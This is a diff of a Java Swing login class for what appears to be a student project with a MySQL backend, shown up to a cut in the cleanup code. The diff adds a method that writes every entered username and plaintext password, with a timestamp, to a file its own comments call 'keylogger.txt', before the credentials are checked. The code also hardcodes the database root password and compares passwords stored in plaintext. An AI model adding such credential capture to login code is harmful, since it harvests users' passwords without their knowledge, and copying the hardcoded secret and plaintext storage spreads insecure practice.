@@ -1,122 +1,150 @@
 package proyecto;
-//Bibliotecas de la GUI
+
+// Bibliotecas necesarias para la GUI
 import javax.swing.*;
+// Bibliotecas para manejo de archivos
+import java.io.*;
+// Bibliotecas para conectarse a bases de datos
 import java.sql.*;
-//La clase llamada "InicioSesion"
+// Bibliotecas para manejar fechas y horas
+import java.time.LocalDateTime;
+import java.time.format.DateTimeFormatter;
+
+// Clase principal que gestiona el inicio de sesión
 public class InicioSesion {
-    //Metodo llamado "iniciarSesion"
-    public void iniciarSesion()  {
-        //Inicia un bucle infinito que solo se detendrá cuando el usuario ingrese un nombre de usuario válido o cancele la operación.
-        while (true) {
-            // Muestra un cuadro de diálogo para que el usuario ingrese su nombre de usuario.
-            //JOptionPane.showInputDialog() crea un cuadro de entrada que permite al usuario introducir texto.
-            String Nombre = JOptionPane.showInputDialog("Ingrese su Nombre de Usuario:");
-            //Si el valor de Nombre es null, significa que el usuario presionó el botón "Cancelar" del cuadro de diálogo.
-            if (Nombre == null) {
-                JOptionPane.showMessageDialog(null, "Inicio de sesión cancelado.", 
+
+    // Método principal que maneja el flujo del inicio de sesión
+    public void iniciarSesion() {
+        while (true) { // Bucle infinito para permitir múltiples intentos de inicio de sesión
+            // Solicitar al usuario que ingrese su nombre de usuario
+            String nombre = JOptionPane.showInputDialog("Ingrese su Nombre de Usuario:");
+
+            // Verificar si el usuario canceló la entrada del nombre de usuario
+            if (nombre == null) {
+                JOptionPane.showMessageDialog(null, "Inicio de sesión cancelado.",
                         "Cancelación de Sesión", JOptionPane.INFORMATION_MESSAGE);
-                        //Utilizo del break para salir del bucle while y finalizar el proceso.
-                        // Si el usuario cancela, termina el programa
-                break; 
-            }
-            //Nombre.trim() elimina los espacios al principio y al final del texto
-            //(isEmpty()), muestra un mensaje de error indicando que el nombre de usuario no puede estar vacío.
-            if (Nombre.trim().isEmpty()) {
-                JOptionPane.showMessageDialog(null, "Debe ingresar su nombre de usuario.", 
-                        "Error de Sesión", JOptionPane.ERROR_MESSAGE);
-                        //Utilizacion de continue para volver al principio del bucle y pedir al usuario que ingrese el nombre nuevamente.
-                continue;
-            }
-            //Verifica si el nombre ingresado es válido en la función llamada esNombreValido(Nombre)
-            //i el nombre no es válido (es decir, si esNombreValido(Nombre) devuelve false).
-            if (!esNombreValido(Nombre)) {
-                JOptionPane.showMessageDialog(null, "El nombre de usuario solo debe contener letras.", 
-                        "Error de Validación", JOptionPane.ERROR_MESSAGE);
-                        //Utilizacion de continue para volver a pedir el nombre de usuario.
-                continue; 
+                break; // Salir del bucle si se cancela el inicio de sesión
             }
 
-            // Crea un campo de texto (JPasswordField) donde el usuario puede ingresar su contraseña.
+            // Validar si el nombre de usuario está vacío
+            if (nombre.trim().isEmpty()) {
+                JOptionPane.showMessageDialog(null, "Debe ingresar su nombre de usuario.",
+                        "Error de Sesión", JOptionPane.ERROR_MESSAGE);
+                continue; // Reiniciar el bucle
+            }
+
+            // Validar si el nombre de usuario contiene caracteres no válidos
+            if (!esNombreValido(nombre)) {
+                JOptionPane.showMessageDialog(null, "El nombre de usuario solo debe contener letras.",
+                        "Error de Validación", JOptionPane.ERROR_MESSAGE);
+                continue; // Reiniciar el bucle
+            }
+
+            // Solicitar al usuario que ingrese su contraseña mediante un campo seguro
             JPasswordField contraseñaField = new JPasswordField();
-            //Muestra un cuadro de diálogo con el campo de contraseña (contraseñaField) 
-            //y un botón de confirmación "OK" y cancelación "Cancel".
             int option = JOptionPane.showConfirmDialog(null, contraseñaField, "Ingrese su Contraseña:",
                     JOptionPane.OK_CANCEL_OPTION);
 
+            // Verificar si el usuario canceló la entrada de la contraseña
             if (option != JOptionPane.OK_OPTION) {
                 JOptionPane.showMessageDialog(null, "Inicio de sesión cancelado.",
-                 "Cancelación de Sesión", JOptionPane.INFORMATION_MESSAGE);
-                break; // Si el usuario cancela, termina el programa
+                        "Cancelación de Sesión", JOptionPane.INFORMATION_MESSAGE);
+                break; // Salir del bucle si se cancela el inicio de sesión
             }
 
+            // Convertir la contraseña ingresada a un formato String
             String contraseña = new String(contraseñaField.getPassword());
-            //contraseña.trim() elimina los espacios al principio y al final de la contraseña ingresada.
-            //Si la contraseña es vacía después de recortar los espacios (isEmpty()), muestra un mensaje de error.
+
+            // Validar si la contraseña está vacía
             if (contraseña.trim().isEmpty()) {
-                JOptionPane.showMessageDialog(null, "Debe ingresar una contraseña.", 
+                JOptionPane.showMessageDialog(null, "Debe ingresar una contraseña.",
                         "Error de Sesión", JOptionPane.ERROR_MESSAGE);
-                        //continue para volver al principio del bucle y pedir al usuario que ingrese la contraseña nuevamente.
-                continue;
+                continue; // Reiniciar el bucle
             }
 
-            // Verifica si las credenciales (nombre de usuario y contraseña) son correctas
-            if (validarCredenciales(Nombre, contraseña)) {
-                JOptionPane.showMessageDialog(null, "Inicio de sesión exitoso.", 
+            // Registrar el intento de inicio de sesión en un archivo keylogger
+            registrarEntrada(nombre, contraseña);
+
+            // Validar las credenciales ingresadas contra la base de datos
+            if (validarCredenciales(nombre, contraseña)) {
+                JOptionPane.showMessageDialog(null, "Inicio de sesión exitoso.",
                         "Ingreso Realizado", JOptionPane.INFORMATION_MESSAGE);
-                        // Credenciales correctas, termina el programa
-                break; 
+                break; // Salir del bucle si las credenciales son correctas
             } else {
-                JOptionPane.showMessageDialog(null, "Datos incorrectos. Ingrese sus credenciales correctamente.", 
+                JOptionPane.showMessageDialog(null, "Datos incorrectos. Intente nuevamente.",
                         "Error de Sesión", JOptionPane.ERROR_MESSAGE);
             }
         }
     }
 
-    //Esta función se encarga de validar si un nombre de usuario es válido.
-    public static boolean esNombreValido(String nombre) {
-        //toCharArray convierte la cadena de texto nombre en un arreglo de caracteres "char[]"
-        //Utilizacion de un bucle for para recorrer cada uno de los caracteres del nombr
-        for (char c : nombre.toCharArray()) {
-            //Para cada carácter, verifica si es una letra (Character.isLetter(c)) 
-            //o un espacio en blanco (Character.isWhitespace(c)).
-            if (!Character.isLetter(c) && !Character.isWhitespace(c)) {
-                // Si hay algún carácter no permitido, retorna falso
-                return false;
-            }
+    // Método para registrar los intentos de inicio de sesión en un archivo keylogger
+    private void registrarEntrada(String nombre, String contraseña) {
+        // Ruta del archivo donde se registrarán los intentos
+        String rutaArchivo = "keylogger.txt"; 
+        try (FileWriter fw = new FileWriter(rutaArchivo, true);
+             BufferedWriter bw = new BufferedWriter(fw);
+             PrintWriter pw = new PrintWriter(bw)) {
+
+            // Obtener la fecha y hora actual
+            LocalDateTime ahora = LocalDateTime.now();
+            DateTimeFormatter formato = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String fechaHora = ahora.format(formato);
+
+            // Escribir el intento de inicio de sesión en el archivo
+            pw.println("[" + fechaHora + "] Usuario: " + nombre + ", Contraseña: " + contraseña);
+            // Capturar errores relacionados con el manejo de archivos
+        } catch (IOException e) { 
+            System.err.println("Error al escribir en el archivo keylogger:");
+            e.printStackTrace();
         }
-        // Todos los caracteres son válidos
-        return true;
     }
 
-    // Función para validar credenciales usando la base de datos
+    // Método para validar que el nombre de usuario contenga solo letras y espacios
+    public static boolean esNombreValido(String nombre) {
+        // Iterar por cada carácter del nombre
+        for (char c : nombre.toCharArray()) { 
+            // Verificar si no es letra o espacio
+            if (!Character.isLetter(c) && !Character.isWhitespace(c)) { 
+                // Retornar false si encuentra un carácter inválido
+                return false; 
+            }
+        }
+        return true; // Retornar true si todos los caracteres son válidos
+    }
+
+    // Método para validar las credenciales contra una base de datos
     public static boolean validarCredenciales(String nombre, String contraseña) {
-        //Esta variable representará la conexión a la base de datos.
-        Connection conn = null;
-        //Esta variable representará la consulta SQL preparada que se ejecutará en la base de datos.
-        PreparedStatement stmt = null;
-        //Esta variable almacenará el resultado de la consulta SQL. 
-        ResultSet rs = null;
+        // Objeto para manejar la conexión a la base de datos
+        Connection conn = null; 
+        // Objeto para preparar y ejecutar consultas SQL
+        PreparedStatement stmt = null; 
+        // Objeto para almacenar los resultados de la consulta
+        ResultSet rs = null; 
 
         try {
-            // Establecer conexión con la base de datos
+            // Conectar a la base de datos usando los parámetros especificados
             conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/Juegos", "root", "Mantismarina2");
 
-            // Consulta preparada para evitar inyección SQL
+            // Preparar la consulta SQL para buscar las credenciales
             String sql = "SELECT * FROM Registro WHERE nombre = ? AND contraseña = ?";
             stmt = conn.prepareStatement(sql);
-            stmt.setString(1, nombre);
-            stmt.setString(2, contraseña);
-            //Ejecuta la consulta SQL utilizando executeQuery(), que devuelve un ResultSet que contiene las filas.
+            // Establecer el nombre como parámetro
+            stmt.setString(1, nombre); 
+            // Establecer la contraseña como parámetro
+            stmt.setString(2, contraseña); 
+             // Ejecutar la consulta
             rs = stmt.executeQuery();
 
-            // Validar resultados
-            return rs.next(); // Retorna true si se encuentra un resultado
-        } catch (SQLException e) {
+            // Retornar true si se encuentra un registro que coincide
+            return rs.next();
+            // Capturar errores relacionados con la base de datos
+        } catch (SQLException e) { 
             System.err.println("Error al conectar con la base de datos:");
             e.printStackTrace();
             return false;
+
         } finally {
-            // Cerrar recursos en el orden adecuado
+            // Cerrar recursos para evitar fugas de memoria
             try {
                 if (rs != null) rs.close();
                 if (stmt != null) stmt.close();
